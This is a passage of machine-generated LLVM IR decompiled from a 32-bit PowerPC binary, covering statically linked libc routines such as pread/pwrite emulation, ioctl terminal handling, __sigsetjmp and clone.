  %v0_10009e20.pr.pre.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009df8.backedge

dec_label_pc_10009df8.backedge:                   ; preds = %dec_label_pc_10009e58, %dec_label_pc_10009e44.dec_label_pc_10009df8.backedge_crit_edge
  %v0_10009e20.pr.pre = phi i32 [ %v0_10009e20.pr.pre.pre, %dec_label_pc_10009e44.dec_label_pc_10009df8.backedge_crit_edge ], [ %v0_10009e60, %dec_label_pc_10009e58 ]
  %v0_10009df8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009df8

dec_label_pc_10009e50:                            ; preds = %dec_label_pc_10009e30
  %v0_10009e50 = load i32, i32* @r11, align 4
  %v3_10009e50 = icmp eq i32 %v0_10009e50, 0
  br i1 %v3_10009e50, label %dec_label_pc_10009e58.preheader, label %dec_label_pc_10009e78.preheader

dec_label_pc_10009e58.preheader:                  ; preds = %dec_label_pc_10009e50
  %v0_10009e58.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009e58

dec_label_pc_10009e78.preheader:                  ; preds = %dec_label_pc_10009e50
  %v0_10009e781 = load i32, i32* @r29, align 4
  %v3_10009e784 = icmp eq i32 %v0_10009e781, 0
  %v0_10009e7c5 = load i32, i32* @r31, align 4
  store i32 %v0_10009e7c5, i32* @r3, align 4
  %v1_10009e807 = add i32 %v0_10009e781, -1
  store i32 %v1_10009e807, i32* @r29, align 4
  br i1 %v3_10009e784, label %dec_label_pc_10009e8c, label %dec_label_pc_10009e74

dec_label_pc_10009e58:                            ; preds = %dec_label_pc_10009e58.preheader, %dec_label_pc_10009e6c
  %v0_10009e58 = phi i32 [ %v0_10009e58.pre, %dec_label_pc_10009e58.preheader ], [ %v0_10009e60, %dec_label_pc_10009e6c ]
  store i32 %v0_10009e58, i32* @r3, align 4
  store i32 268476000, i32* @lr, align 4
  %v0_10009e5c = call i32 @suspend.10()
  %v0_10009e60 = load i32, i32* @r31, align 4
  %v1_10009e60 = add i32 %v0_10009e60, 12
  %v2_10009e60 = inttoptr i32 %v1_10009e60 to i32*
  %v3_10009e60 = load i32, i32* %v2_10009e60, align 4
  %v3_10009e64 = icmp eq i32 %v3_10009e60, 0
  br i1 %v3_10009e64, label %dec_label_pc_10009df8.backedge, label %dec_label_pc_10009e6c

dec_label_pc_10009e6c:                            ; preds = %dec_label_pc_10009e58
  br label %dec_label_pc_10009e58

dec_label_pc_10009e74:                            ; preds = %dec_label_pc_10009e78.preheader, %dec_label_pc_10009e74
  %v0_10009e7c8 = phi i32 [ %v0_10009e7c, %dec_label_pc_10009e74 ], [ %v0_10009e7c5, %dec_label_pc_10009e78.preheader ]
  store i32 268476024, i32* @lr, align 4
  %v1_10009e74 = call i32 @restart.9(i32 %v0_10009e7c8)
  %v0_10009e78 = load i32, i32* @r29, align 4
  %v3_10009e78 = icmp eq i32 %v0_10009e78, 0
  %v0_10009e7c = load i32, i32* @r31, align 4
  store i32 %v0_10009e7c, i32* @r3, align 4
  %v1_10009e80 = add i32 %v0_10009e78, -1
  store i32 %v1_10009e80, i32* @r29, align 4
  br i1 %v3_10009e78, label %dec_label_pc_10009e8c, label %dec_label_pc_10009e74

dec_label_pc_10009e8c:                            ; preds = %dec_label_pc_10009e74, %dec_label_pc_10009e78.preheader, %dec_label_pc_10009dd4
  %.0 = phi i32 [ undef, %dec_label_pc_10009dd4 ], [ %v0_10009e7c5, %dec_label_pc_10009e78.preheader ], [ %v0_10009e7c, %dec_label_pc_10009e74 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_10009e7c, { 0, 2, 1 }
  uselistorder i32 %v0_10009e60, { 2, 0, 1 }
  uselistorder i32 %v0_10009e7c5, { 1, 0, 2 }
  uselistorder i32 %v2_10009df8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10009e20.pr, { 2, 0, 1 }
  uselistorder i32 ()* @suspend.10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009e74, { 1, 0 }
  uselistorder label %dec_label_pc_10009e58, { 1, 0 }
  uselistorder label %dec_label_pc_10009e30, { 1, 0 }
  uselistorder label %dec_label_pc_10009e20, { 1, 0 }
  uselistorder label %dec_label_pc_10009e18, { 1, 0 }
  uselistorder label %dec_label_pc_10009df4, { 1, 0 }
}

define i32 @__fake_pread_write64(i32 %arg1) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v0_10009eb0 = load i32, i32* @r7, align 4
  store i32 %v0_10009eb0, i32* %r28.global-to-local, align 4
  %v0_10009ec4 = load i32, i32* @r8, align 4
  store i32 %v0_10009ec4, i32* %r29.global-to-local, align 4
  %v0_10009ec8 = load i32, i32* @r4, align 4
  store i32 %v0_10009ec8, i32* %r26.global-to-local, align 4
  %v0_10009ecc = load i32, i32* @r9, align 4
  store i32 %v0_10009ecc, i32* %r24.global-to-local, align 4
  store i32 %arg1, i32* %r27.global-to-local, align 4
  store i32 268476120, i32* @lr, align 4
  %v4_10009ed4 = call i32 @__libc_lseek64(i32 0, i32 0, i32 1, i32 0)
  store i32 %v4_10009ed4, i32* %r30.global-to-local, align 4
  %v0_10009edc = load i32, i32* @r4, align 4
  store i32 %v0_10009edc, i32* @r31, align 4
  %v3_10009ee0 = icmp eq i32 %v4_10009ed4, -1
  br i1 %v3_10009ee0, label %dec_label_pc_10009ee8, label %dec_label_pc_10009ef0

dec_label_pc_10009ee8:                            ; preds = %entry
  %v3_10009ee8 = icmp eq i32 %v0_10009edc, -1
  br i1 %v3_10009ee8, label %dec_label_pc_10009f84, label %dec_label_pc_10009ef0

dec_label_pc_10009ef0:                            ; preds = %entry, %dec_label_pc_10009ee8
  %v0_10009ef0 = load i32, i32* %r28.global-to-local, align 4
  %v0_10009ef4 = load i32, i32* %r29.global-to-local, align 4
  %v0_10009ef8 = load i32, i32* %r27.global-to-local, align 4
  store i32 268476164, i32* @lr, align 4
  %v4_10009f00 = call i32 @__libc_lseek64(i32 %v0_10009ef8, i32 %v0_10009ef0, i32 %v0_10009ef4, i32 0)
  %v3_10009f04 = icmp eq i32 %v4_10009f00, -1
  br i1 %v3_10009f04, label %dec_label_pc_10009f0c, label %dec_label_pc_10009f14

dec_label_pc_10009f0c:                            ; preds = %dec_label_pc_10009ef0
  %v0_10009f0c = load i32, i32* @r4, align 4
  %v3_10009f0c = icmp eq i32 %v0_10009f0c, -1
  br i1 %v3_10009f0c, label %dec_label_pc_10009f84, label %dec_label_pc_10009f14

dec_label_pc_10009f14:                            ; preds = %dec_label_pc_10009ef0, %dec_label_pc_10009f0c
  %v0_10009f14 = load i32, i32* %r24.global-to-local, align 4
  %v3_10009f14 = icmp eq i32 %v0_10009f14, 1
  %v0_10009f24 = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_10009f14, label %dec_label_pc_10009f1c, label %dec_label_pc_10009f30

dec_label_pc_10009f1c:                            ; preds = %dec_label_pc_10009f14
  %v0_10009f1c = load i32, i32* %r26.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10009f2c.360 to i32), i32* @lr, align 4
  %v2_10009f28 = call i32 @__libc_write(i32 %v0_10009f24, i32 %v0_10009f1c)
  br label %dec_label_pc_10009f40

dec_label_pc_10009f30:                            ; preds = %dec_label_pc_10009f14
  store i32 268476224, i32* @lr, align 4
  %v1_10009f3c = call i32 @__libc_read(i32 %v0_10009f24)
  br label %dec_label_pc_10009f40

dec_label_pc_10009f40:                            ; preds = %dec_label_pc_10009f1c, %dec_label_pc_10009f30
  %storemerge = phi i32 [ %v1_10009f3c, %dec_label_pc_10009f30 ], [ %v2_10009f28, %dec_label_pc_10009f1c ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v0_10009f44 = call i32 @__errno_location()
  store i32 %v0_10009f44, i32* %r29.global-to-local, align 4
  %v0_10009f4c = load i32, i32* @r31, align 4
  %v0_10009f50 = load i32, i32* %r30.global-to-local, align 4
  %v0_10009f54 = load i32, i32* %r27.global-to-local, align 4
  %v1_10009f5c = inttoptr i32 %v0_10009f44 to i32*
  %v2_10009f5c = load i32, i32* %v1_10009f5c, align 4
  store i32 %v2_10009f5c, i32* @r31, align 4
  store i32 268476260, i32* @lr, align 4
  %v4_10009f60 = call i32 @__libc_lseek64(i32 %v0_10009f54, i32 %v0_10009f50, i32 %v0_10009f4c, i32 0)
  %v3_10009f64 = icmp eq i32 %v4_10009f60, -1
  br i1 %v3_10009f64, label %dec_label_pc_10009f6c, label %dec_label_pc_10009f7c

dec_label_pc_10009f6c:                            ; preds = %dec_label_pc_10009f40
  %v0_10009f6c = load i32, i32* @r4, align 4
  %v3_10009f6c = icmp eq i32 %v0_10009f6c, -1
  br i1 %v3_10009f6c, label %dec_label_pc_10009f74, label %dec_label_pc_10009f7c

dec_label_pc_10009f74:                            ; preds = %dec_label_pc_10009f6c
  %v0_10009f74 = load i32, i32* %r28.global-to-local, align 4
  %v3_10009f74 = icmp eq i32 %v0_10009f74, -1
  br i1 %v3_10009f74, label %dec_label_pc_10009f7c, label %dec_label_pc_10009f84

dec_label_pc_10009f7c:                            ; preds = %dec_label_pc_10009f74, %dec_label_pc_10009f6c, %dec_label_pc_10009f40
  %v0_10009f7c = load i32, i32* @r31, align 4
  %v1_10009f7c = load i32, i32* %r29.global-to-local, align 4
  %v2_10009f7c = inttoptr i32 %v1_10009f7c to i32*
  store i32 %v0_10009f7c, i32* %v2_10009f7c, align 4
  %v0_10009f8c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10009f88

dec_label_pc_10009f84:                            ; preds = %dec_label_pc_10009f74, %dec_label_pc_10009f0c, %dec_label_pc_10009ee8
  store i32 -1, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10009f88

dec_label_pc_10009f88:                            ; preds = %dec_label_pc_10009f7c, %dec_label_pc_10009f84
  %v0_10009f8c = phi i32 [ %v0_10009f8c.pre, %dec_label_pc_10009f7c ], [ -1, %dec_label_pc_10009f84 ]
  ret i32 %v0_10009f8c

; uselistorder directives
  uselistorder label %dec_label_pc_10009f88, { 1, 0 }
  uselistorder label %dec_label_pc_10009f40, { 1, 0 }
  uselistorder label %dec_label_pc_10009f14, { 1, 0 }
  uselistorder label %dec_label_pc_10009ef0, { 1, 0 }
}

define i32 @__libc_pwrite64() local_unnamed_addr {
entry:
  store i32 1, i32* @r9, align 4
  %v1_10009fa4 = call i32 @__fake_pread_write64(i32 1)
  ret i32 %v1_10009fa4
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 0, i32* @r9, align 4
  %v1_10009fac = call i32 @__fake_pread_write64(i32 0)
  ret i32 %v1_10009fac

; uselistorder directives
  uselistorder i32 (i32)* @__fake_pread_write64, { 1, 0 }
}

define i32 @__fake_pread_write(i32 %arg1) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v0_10009fbc = load i32, i32* @r4, align 4
  store i32 %v0_10009fbc, i32* %r28.global-to-local, align 4
  %v0_10009fd0 = load i32, i32* @r6, align 4
  store i32 %v0_10009fd0, i32* @r31, align 4
  %v0_10009fd4 = load i32, i32* @r7, align 4
  store i32 %v0_10009fd4, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 268476384, i32* @lr, align 4
  %v3_10009fdc = call i32 @__GI___libc_lseek(i32 0, i32 1, i32 1)
  %v3_10009fe0 = icmp eq i32 %v3_10009fdc, -1
  store i32 %v3_10009fdc, i32* %r26.global-to-local, align 4
  br i1 %v3_10009fe0, label %dec_label_pc_1000a068, label %dec_label_pc_10009fec

dec_label_pc_10009fec:                            ; preds = %entry
  %v0_10009fec = load i32, i32* @r31, align 4
  %v0_10009ff0 = load i32, i32* %r29.global-to-local, align 4
  store i32 268476412, i32* @lr, align 4
  %v3_10009ff8 = call i32 @__GI___libc_lseek(i32 %v0_10009ff0, i32 %v0_10009fec, i32 0)
  %v3_10009ffc = icmp eq i32 %v3_10009ff8, -1
  br i1 %v3_10009ffc, label %dec_label_pc_1000a068, label %dec_label_pc_1000a004

dec_label_pc_1000a004:                            ; preds = %dec_label_pc_10009fec
  %v0_1000a004 = load i32, i32* %r30.global-to-local, align 4
  %v3_1000a004 = icmp eq i32 %v0_1000a004, 1
  %v0_1000a014 = load i32, i32* %r29.global-to-local, align 4
  br i1 %v3_1000a004, label %dec_label_pc_1000a00c, label %dec_label_pc_1000a020

dec_label_pc_1000a00c:                            ; preds = %dec_label_pc_1000a004
  %v0_1000a00c = load i32, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a01c.361 to i32), i32* @lr, align 4
  %v2_1000a018 = call i32 @__libc_write(i32 %v0_1000a014, i32 %v0_1000a00c)
  br label %dec_label_pc_1000a030

dec_label_pc_1000a020:                            ; preds = %dec_label_pc_1000a004
  store i32 268476464, i32* @lr, align 4
  %v1_1000a02c = call i32 @__libc_read(i32 %v0_1000a014)
  br label %dec_label_pc_1000a030

dec_label_pc_1000a030:                            ; preds = %dec_label_pc_1000a00c, %dec_label_pc_1000a020
  %storemerge = phi i32 [ %v1_1000a02c, %dec_label_pc_1000a020 ], [ %v2_1000a018, %dec_label_pc_1000a00c ]
  store i32 %storemerge, i32* %r30.global-to-local, align 4
  %v0_1000a034 = call i32 @__errno_location()
  store i32 %v0_1000a034, i32* @r31, align 4
  %v0_1000a03c = load i32, i32* %r26.global-to-local, align 4
  %v0_1000a040 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000a048 = inttoptr i32 %v0_1000a034 to i32*
  %v2_1000a048 = load i32, i32* %v1_1000a048, align 4
  store i32 %v2_1000a048, i32* %r29.global-to-local, align 4
  store i32 268476496, i32* @lr, align 4
  %v3_1000a04c = call i32 @__GI___libc_lseek(i32 %v0_1000a040, i32 %v0_1000a03c, i32 0)
  %v3_1000a050 = icmp eq i32 %v3_1000a04c, -1
  br i1 %v3_1000a050, label %dec_label_pc_1000a058, label %dec_label_pc_1000a060

dec_label_pc_1000a058:                            ; preds = %dec_label_pc_1000a030
  %v0_1000a058 = load i32, i32* %r30.global-to-local, align 4
  %v3_1000a058 = icmp eq i32 %v0_1000a058, -1
  br i1 %v3_1000a058, label %dec_label_pc_1000a060, label %dec_label_pc_1000a068

dec_label_pc_1000a060:                            ; preds = %dec_label_pc_1000a058, %dec_label_pc_1000a030
  %v0_1000a060 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000a060 = load i32, i32* @r31, align 4
  %v2_1000a060 = inttoptr i32 %v1_1000a060 to i32*
  store i32 %v0_1000a060, i32* %v2_1000a060, align 4
  %v0_1000a070.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a06c

dec_label_pc_1000a068:                            ; preds = %dec_label_pc_1000a058, %dec_label_pc_10009fec, %entry
  store i32 -1, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a06c

dec_label_pc_1000a06c:                            ; preds = %dec_label_pc_1000a060, %dec_label_pc_1000a068
  %v0_1000a070 = phi i32 [ %v0_1000a070.pre, %dec_label_pc_1000a060 ], [ -1, %dec_label_pc_1000a068 ]
  ret i32 %v0_1000a070

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000a06c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a030, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 1, i32* @r7, align 4
  %v1_1000a088 = call i32 @__fake_pread_write(i32 1)
  ret i32 %v1_1000a088
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @r7, align 4
  %v1_1000a090 = call i32 @__fake_pread_write(i32 0)
  ret i32 %v1_1000a090

; uselistorder directives
  uselistorder i32 (i32)* @__fake_pread_write, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 -2143521772, i32* @r10, align 4
  %v4_1000a0a4 = icmp eq i32 %arg2, -2143521772
  %v2_1000a0b8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000a0b8, i32* %stack_var_-32, align 4
  br i1 %v4_1000a0a4, label %dec_label_pc_1000a118, label %dec_label_pc_1000a0d8

dec_label_pc_1000a0d8:                            ; preds = %entry
  %v3_1000a0d8 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000a0d8, label %dec_label_pc_1000a0f0, label %dec_label_pc_1000a0e0

dec_label_pc_1000a0e0:                            ; preds = %dec_label_pc_1000a0d8
  %v3_1000a0e4 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_1000a0e4, label %dec_label_pc_1000a10c, label %dec_label_pc_1000a138

dec_label_pc_1000a0f0:                            ; preds = %dec_label_pc_1000a0d8
  %v1_1000a0f0 = xor i32 %arg2, -2143551488
  %v3_1000a0f4 = icmp eq i32 %v1_1000a0f0, 29717
  br i1 %v3_1000a0f4, label %dec_label_pc_1000a128, label %dec_label_pc_1000a0fc

dec_label_pc_1000a0fc:                            ; preds = %dec_label_pc_1000a0f0
  %v3_1000a100 = icmp eq i32 %v1_1000a0f0, 29718
  br i1 %v3_1000a100, label %dec_label_pc_1000a130, label %dec_label_pc_1000a138

dec_label_pc_1000a10c:                            ; preds = %dec_label_pc_1000a0e0
  store i32 ptrtoint (i32* @global_var_1000a114.362 to i32), i32* @lr, align 4
  %v1_1000a110 = inttoptr i32 %arg3 to i32*
  %v2_1000a110 = call i32 @__GI_tcgetattr(i32* %v1_1000a110)
  br label %dec_label_pc_1000a120

dec_label_pc_1000a118:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1000a11c

dec_label_pc_1000a11c:                            ; preds = %dec_label_pc_1000a130, %dec_label_pc_1000a128, %dec_label_pc_1000a118
  store i32 268476704, i32* @lr, align 4
  %v0_1000a11c = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_1000a120

dec_label_pc_1000a120:                            ; preds = %dec_label_pc_1000a10c, %dec_label_pc_1000a11c
  %storemerge = phi i32 [ %v0_1000a11c, %dec_label_pc_1000a11c ], [ %v2_1000a110, %dec_label_pc_1000a10c ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a164

dec_label_pc_1000a128:                            ; preds = %dec_label_pc_1000a0f0
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1000a11c

dec_label_pc_1000a130:                            ; preds = %dec_label_pc_1000a0fc
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_1000a11c

dec_label_pc_1000a138:                            ; preds = %dec_label_pc_1000a0fc, %dec_label_pc_1000a0e0
  %v0_1000a148 = call i32 @__asm_mfcr()
  %v1_1000a14c = and i32 %v0_1000a148, 268435456
  %v3_1000a14c = icmp eq i32 %v1_1000a14c, 0
  store i32 %v0_1000a148, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a14c, label %dec_label_pc_1000a164, label %dec_label_pc_1000a158

dec_label_pc_1000a158:                            ; preds = %dec_label_pc_1000a138
  %v0_1000a158 = call i32 @__errno_location()
  %v0_1000a15c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a15c = inttoptr i32 %v0_1000a158 to i32*
  store i32 %v0_1000a15c, i32* %v2_1000a15c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a164

dec_label_pc_1000a164:                            ; preds = %dec_label_pc_1000a138, %dec_label_pc_1000a120, %dec_label_pc_1000a158
  %v0_1000a168 = phi i32 [ %v0_1000a148, %dec_label_pc_1000a138 ], [ %storemerge, %dec_label_pc_1000a120 ], [ -1, %dec_label_pc_1000a158 ]
  ret i32 %v0_1000a168

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000a164, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a120, { 1, 0 }
}

define i32 @__sigsetjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  store i32 0, i32* %r15.global-to-local, align 4
  store i32 0, i32* %r14.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_1000a17c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v3_1000a17c, i32* %arg1, align 4
  %v0_1000a180 = load i32, i32* @lr, align 4
  store i32 %v0_1000a180, i32* %r0.global-to-local, align 4
  %v0_1000a184 = load i32, i32* @r2, align 4
  %v2_1000a184 = add i32 %tmp, 4
  %v3_1000a184 = inttoptr i32 %v2_1000a184 to i32*
  store i32 %v0_1000a184, i32* %v3_1000a184, align 4
  %v0_1000a188 = load i32, i32* %r14.global-to-local, align 4
  %v2_1000a188 = add i32 %tmp, 12
  %v3_1000a188 = inttoptr i32 %v2_1000a188 to i32*
  store i32 %v0_1000a188, i32* %v3_1000a188, align 4
  %v0_1000a190 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000a190 = add i32 %tmp, 8
  %v3_1000a190 = inttoptr i32 %v2_1000a190 to i32*
  store i32 %v0_1000a190, i32* %v3_1000a190, align 4
  %v0_1000a194 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000a194 = add i32 %tmp, 16
  %v3_1000a194 = inttoptr i32 %v2_1000a194 to i32*
  store i32 %v0_1000a194, i32* %v3_1000a194, align 4
  %v0_1000a19c = call i32 @__asm_mfcr()
  store i32 %v0_1000a19c, i32* @r3, align 4
  store i32 %v0_1000a19c, i32* %r0.global-to-local, align 4
  %v0_1000a1a0 = load i32, i32* @r16, align 4
  %v2_1000a1a0 = add i32 %v0_1000a19c, 20
  %v3_1000a1a0 = inttoptr i32 %v2_1000a1a0 to i32*
  store i32 %v0_1000a1a0, i32* %v3_1000a1a0, align 4
  %v2_1000a1a8 = add i32 %v0_1000a19c, 84
  %v3_1000a1a8 = inttoptr i32 %v2_1000a1a8 to i32*
  store i32 %v0_1000a19c, i32* %v3_1000a1a8, align 4
  %v0_1000a1ac = load i32, i32* @r17, align 4
  %v2_1000a1ac = add i32 %v0_1000a19c, 24
  %v3_1000a1ac = inttoptr i32 %v2_1000a1ac to i32*
  store i32 %v0_1000a1ac, i32* %v3_1000a1ac, align 4
  %v0_1000a1b4 = load i32, i32* @r18, align 4
  %v2_1000a1b4 = add i32 %v0_1000a19c, 28
  %v3_1000a1b4 = inttoptr i32 %v2_1000a1b4 to i32*
  store i32 %v0_1000a1b4, i32* %v3_1000a1b4, align 4
  %v0_1000a1bc = load i32, i32* @r19, align 4
  %v2_1000a1bc = add i32 %v0_1000a19c, 32
  %v3_1000a1bc = inttoptr i32 %v2_1000a1bc to i32*
  store i32 %v0_1000a1bc, i32* %v3_1000a1bc, align 4
  %v0_1000a1c4 = load i32, i32* @r20, align 4
  %v2_1000a1c4 = add i32 %v0_1000a19c, 36
  %v3_1000a1c4 = inttoptr i32 %v2_1000a1c4 to i32*
  store i32 %v0_1000a1c4, i32* %v3_1000a1c4, align 4
  %v0_1000a1cc = load i32, i32* @r21, align 4
  %v2_1000a1cc = add i32 %v0_1000a19c, 40
  %v3_1000a1cc = inttoptr i32 %v2_1000a1cc to i32*
  store i32 %v0_1000a1cc, i32* %v3_1000a1cc, align 4
  %v0_1000a1d4 = load i32, i32* @r22, align 4
  %v2_1000a1d4 = add i32 %v0_1000a19c, 44
  %v3_1000a1d4 = inttoptr i32 %v2_1000a1d4 to i32*
  store i32 %v0_1000a1d4, i32* %v3_1000a1d4, align 4
  %v0_1000a1dc = load i32, i32* @r23, align 4
  %v2_1000a1dc = add i32 %v0_1000a19c, 48
  %v3_1000a1dc = inttoptr i32 %v2_1000a1dc to i32*
  store i32 %v0_1000a1dc, i32* %v3_1000a1dc, align 4
  %v0_1000a1e4 = load i32, i32* @r24, align 4
  %v2_1000a1e4 = add i32 %v0_1000a19c, 52
  %v3_1000a1e4 = inttoptr i32 %v2_1000a1e4 to i32*
  store i32 %v0_1000a1e4, i32* %v3_1000a1e4, align 4
  %v0_1000a1ec = load i32, i32* @r25, align 4
  %v2_1000a1ec = add i32 %v0_1000a19c, 56
  %v3_1000a1ec = inttoptr i32 %v2_1000a1ec to i32*
  store i32 %v0_1000a1ec, i32* %v3_1000a1ec, align 4
  %v0_1000a1f4 = load i32, i32* @r26, align 4
  %v2_1000a1f4 = add i32 %v0_1000a19c, 60
  %v3_1000a1f4 = inttoptr i32 %v2_1000a1f4 to i32*
  store i32 %v0_1000a1f4, i32* %v3_1000a1f4, align 4
  %v0_1000a1fc = load i32, i32* @r27, align 4
  %v2_1000a1fc = add i32 %v0_1000a19c, 64
  %v3_1000a1fc = inttoptr i32 %v2_1000a1fc to i32*
  store i32 %v0_1000a1fc, i32* %v3_1000a1fc, align 4
  %v0_1000a204 = load i32, i32* @r28, align 4
  %v2_1000a204 = add i32 %v0_1000a19c, 68
  %v3_1000a204 = inttoptr i32 %v2_1000a204 to i32*
  store i32 %v0_1000a204, i32* %v3_1000a204, align 4
  %v0_1000a20c = load i32, i32* @r29, align 4
  %v2_1000a20c = add i32 %v0_1000a19c, 72
  %v3_1000a20c = inttoptr i32 %v2_1000a20c to i32*
  store i32 %v0_1000a20c, i32* %v3_1000a20c, align 4
  %v0_1000a214 = load i32, i32* @r30, align 4
  %v2_1000a214 = add i32 %v0_1000a19c, 76
  %v3_1000a214 = inttoptr i32 %v2_1000a214 to i32*
  store i32 %v0_1000a214, i32* %v3_1000a214, align 4
  %v0_1000a21c = load i32, i32* @r31, align 4
  %v2_1000a21c = add i32 %v0_1000a19c, 80
  %v3_1000a21c = inttoptr i32 %v2_1000a21c to i32*
  store i32 %v0_1000a21c, i32* %v3_1000a21c, align 4
  %v0_1000a224 = call i32 @__sigjmp_save()
  ret i32 %v0_1000a224

; uselistorder directives
  uselistorder i32 %v0_1000a19c, { 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 2, 3, 4, 16, 5, 17, 19, 18 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32 72, { 2, 1, 0 }
  uselistorder i32 68, { 1, 0, 2, 3 }
}

define i32 @clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %v0_1000a230 = load i32, i32* @r2, align 4
  %v3_1000a230 = call %1 @__asm_cror(i32 %v0_1000a230, i32 %arg4, i32 %v0_1000a230)
  %v6_1000a230 = extractvalue %1 %v3_1000a230, 2
  br i1 %v6_1000a230, label %dec_label_pc_1000a294, label %dec_label_pc_1000a238

dec_label_pc_1000a238:                            ; preds = %entry
  %v1_1000a240 = call i32 @__asm_rlwinm(i32 %arg2, i32 0, i32 0, i32 27)
  %v2_1000a248 = add i32 %v1_1000a240, -16
  %v3_1000a248 = inttoptr i32 %v2_1000a248 to i32*
  store i32 0, i32* %v3_1000a248, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %v2_1000a248, i32* @r30, align 4
  store i32 %arg4, i32* @r31, align 4
  store i32 %arg3, i32* @r3, align 4
  %v3_1000a264 = icmp eq i32 %arg3, 0
  %v3_1000a268 = call %2 @__asm_crandc(i32 %arg4, i32 %arg4, i32 %arg3)
  %v7_1000a268 = extractvalue %2 %v3_1000a268, 3
  br i1 %v3_1000a264, label %dec_label_pc_1000a270, label %dec_label_pc_1000a284

dec_label_pc_1000a270:                            ; preds = %dec_label_pc_1000a238
  %v0_1000a274 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000a278 = load i32, i32* @r31, align 4
  call void @__pseudo_call(i32 %v0_1000a274)
  %v1_1000a280 = call i32 @__GI__exit(i32 %v0_1000a278)
  store i32 %v1_1000a280, i32* @r3, align 4
  %v1_1000a28c.pre = load i1, i1* @cr0_so, align 1
  br label %dec_label_pc_1000a284

dec_label_pc_1000a284:                            ; preds = %dec_label_pc_1000a238, %dec_label_pc_1000a270
  %v1_1000a28c = phi i1 [ %v7_1000a268, %dec_label_pc_1000a238 ], [ %v1_1000a28c.pre, %dec_label_pc_1000a270 ]
  %v2_1000a28c = xor i1 %v1_1000a28c, true
  call void @__pseudo_cond_branch(i1 %v2_1000a28c, i32 ptrtoint (i32* @global_var_1000a280.363 to i32))
  %v0_1000a290 = call i32 @__syscall_error()
  br label %dec_label_pc_1000a294

dec_label_pc_1000a294:                            ; preds = %entry, %dec_label_pc_1000a284
  store i32 22, i32* @r3, align 4
  %v0_1000a298 = call i32 @__syscall_error()
  ret i32 %v0_1000a298

; uselistorder directives
  uselistorder i32* @r2, { 32, 36, 56, 21, 57, 13, 50, 44, 43, 0, 14, 15, 16, 1, 2, 3, 4, 17, 18, 5, 19, 20, 22, 23, 45, 46, 58, 59, 48, 49, 24, 25, 6, 7, 26, 27, 51, 53, 54, 8, 42, 28, 29, 40, 41, 39, 60, 61, 62, 55, 52, 30, 47, 9, 10, 11, 12, 31, 65, 33, 34, 37, 35, 38, 64, 63 }
  uselistorder i32 %arg4, { 1, 0, 3, 2 }
